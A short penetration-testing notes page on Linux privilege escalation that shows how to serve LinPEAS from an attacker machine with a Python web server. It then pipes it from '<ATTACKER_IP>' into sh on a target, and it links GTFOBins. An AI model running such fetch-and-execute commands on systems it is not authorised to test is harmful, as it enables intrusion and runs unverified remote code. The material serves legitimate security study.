---
description: Tools and methodology for Linux PrivEsc
---

# Linux

## 🔥 LinPEAS - Linux Privilege Escalation Awesome Script

When escalating privileges, one of the **fastest** ways to transfer and execute an enumeration script like `linpeas.sh` is using Python’s built-in HTTP server combined with `curl`.

***

#### &#x20;**📌 Attacker: Start a Simple Web Server**

Run the following command on your **attacking machine** (Kali, Parrot, etc.) to serve files from the current directory:

```bash
python3 -m http.server 80
```

#### &#x20;**📌 Victim: Download & Execute LinPEAS**

On the **target machine**, download and execute LinPEAS in one step:

```bash
curl <ATTACKER_IP>/linpeas.sh | sh
```

## 🛑 GTFOBins

[https://gtfobins.github.io/](https://gtfobins.github.io/)
